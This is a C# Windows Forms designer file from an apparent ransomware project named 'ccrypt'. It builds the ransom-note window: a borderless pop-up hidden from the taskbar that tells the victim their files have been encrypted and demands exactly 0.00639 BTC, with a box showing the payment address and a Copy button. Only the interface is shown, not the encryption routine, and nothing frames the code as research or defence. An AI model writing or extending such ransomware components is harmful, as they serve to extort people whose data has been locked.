
namespace ccrypt
{
    partial class payload
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(payload));
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.siticoneTransparentDrag1 = new Siticone.UI.WinForms.SiticoneTransparentDrag();
            this.label3 = new System.Windows.Forms.Label();
            this.lblBitcoinAmount = new System.Windows.Forms.Label();
            this.lblCount = new System.Windows.Forms.Label();
            this.txtBitcoinAddress = new Siticone.UI.WinForms.SiticoneTextBox();
            this.copybtn = new Siticone.UI.WinForms.SiticoneButton();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
            this.pictureBox1.Location = new System.Drawing.Point(216, -62);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(310, 243);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox1.TabIndex = 0;
            this.pictureBox1.TabStop = false;
            // 
            // siticoneTransparentDrag1
            // 
            this.siticoneTransparentDrag1.DragEndTransparencyValue = 1D;
            this.siticoneTransparentDrag1.DragStartTransparencyValue = 0.9D;
            this.siticoneTransparentDrag1.TargetDragControl = this;
            // 
            // label3
            // 
            this.label3.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 27.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.ForeColor = System.Drawing.Color.White;
            this.label3.Location = new System.Drawing.Point(-89, 158);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(914, 58);
            this.label3.TabIndex = 11;
            this.label3.Text = "In order to recover your data...";
            this.label3.TextAlign = System.Drawing.ContentAlignment.TopCenter;
            // 
            // lblBitcoinAmount
            // 
            this.lblBitcoinAmount.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.lblBitcoinAmount.Font = new System.Drawing.Font("Microsoft Sans Serif", 20.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lblBitcoinAmount.ForeColor = System.Drawing.Color.White;
            this.lblBitcoinAmount.Location = new System.Drawing.Point(-79, 212);
            this.lblBitcoinAmount.Name = "lblBitcoinAmount";
            this.lblBitcoinAmount.Size = new System.Drawing.Size(906, 55);
            this.lblBitcoinAmount.TabIndex = 7;
            this.lblBitcoinAmount.Text = "Send Exactly 0.00639 BTC To The BTC Address Below";
            this.lblBitcoinAmount.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // lblCount
            // 
            this.lblCount.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.lblCount.Font = new System.Drawing.Font("Microsoft Sans Serif", 26.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lblCount.ForeColor = System.Drawing.Color.White;
            this.lblCount.Location = new System.Drawing.Point(-81, 97);
            this.lblCount.Name = "lblCount";
            this.lblCount.Size = new System.Drawing.Size(914, 55);
            this.lblCount.TabIndex = 6;
            this.lblCount.Text = "Your files (count: n) have been encrypted!";
            this.lblCount.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // txtBitcoinAddress
            // 
            this.txtBitcoinAddress.BackColor = System.Drawing.Color.DimGray;
            this.txtBitcoinAddress.BorderColor = System.Drawing.Color.Crimson;
            this.txtBitcoinAddress.BorderRadius = 2;
            this.txtBitcoinAddress.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtBitcoinAddress.DefaultText = "YOUR BTC ADDRESS";
            this.txtBitcoinAddress.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.txtBitcoinAddress.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.txtBitcoinAddress.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtBitcoinAddress.DisabledState.Parent = this.txtBitcoinAddress;
            this.txtBitcoinAddress.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtBitcoinAddress.FillColor = System.Drawing.Color.DimGray;
            this.txtBitcoinAddress.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtBitcoinAddress.FocusedState.Parent = this.txtBitcoinAddress;
            this.txtBitcoinAddress.ForeColor = System.Drawing.Color.White;
            this.txtBitcoinAddress.HoveredState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.txtBitcoinAddress.HoveredState.Parent = this.txtBitcoinAddress;
            this.txtBitcoinAddress.Location = new System.Drawing.Point(25, 291);
            this.txtBitcoinAddress.Name = "txtBitcoinAddress";
            this.txtBitcoinAddress.PasswordChar = '\0';
            this.txtBitcoinAddress.PlaceholderText = "";
            this.txtBitcoinAddress.SelectedText = "";
            this.txtBitcoinAddress.ShadowDecoration.Parent = this.txtBitcoinAddress;
            this.txtBitcoinAddress.Size = new System.Drawing.Size(480, 36);
            this.txtBitcoinAddress.TabIndex = 13;
            this.txtBitcoinAddress.TextChanged += new System.EventHandler(this.txtBitcoinAddress_TextChanged);
            // 
            // copybtn
            // 
            this.copybtn.BorderColor = System.Drawing.Color.Crimson;
            this.copybtn.BorderRadius = 2;
            this.copybtn.BorderThickness = 1;
            this.copybtn.CheckedState.Parent = this.copybtn;
            this.copybtn.CustomImages.Parent = this.copybtn;
            this.copybtn.FillColor = System.Drawing.Color.DimGray;
            this.copybtn.Font = new System.Drawing.Font("Segoe UI", 14.25F, System.Drawing.FontStyle.Bold);
            this.copybtn.ForeColor = System.Drawing.Color.White;
            this.copybtn.HoveredState.Parent = this.copybtn;
            this.copybtn.Location = new System.Drawing.Point(519, 291);
            this.copybtn.Name = "copybtn";
            this.copybtn.ShadowDecoration.Parent = this.copybtn;
            this.copybtn.Size = new System.Drawing.Size(206, 36);
            this.copybtn.TabIndex = 14;
            this.copybtn.Text = "Copy";
            this.copybtn.Click += new System.EventHandler(this.copybtn_Click);
            // 
            // payload
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.DimGray;
            this.ClientSize = new System.Drawing.Size(753, 356);
            this.Controls.Add(this.copybtn);
            this.Controls.Add(this.txtBitcoinAddress);
            this.Controls.Add(this.label3);
            this.Controls.Add(this.lblBitcoinAmount);
            this.Controls.Add(this.lblCount);
            this.Controls.Add(this.pictureBox1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "payload";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "payload";
            this.Load += new System.EventHandler(this.payload_Load);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.PictureBox pictureBox1;
        private Siticone.UI.WinForms.SiticoneTransparentDrag siticoneTransparentDrag1;
        private Siticone.UI.WinForms.SiticoneButton copybtn;
        private Siticone.UI.WinForms.SiticoneTextBox txtBitcoinAddress;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.Label lblBitcoinAmount;
        private System.Windows.Forms.Label lblCount;
    }
}

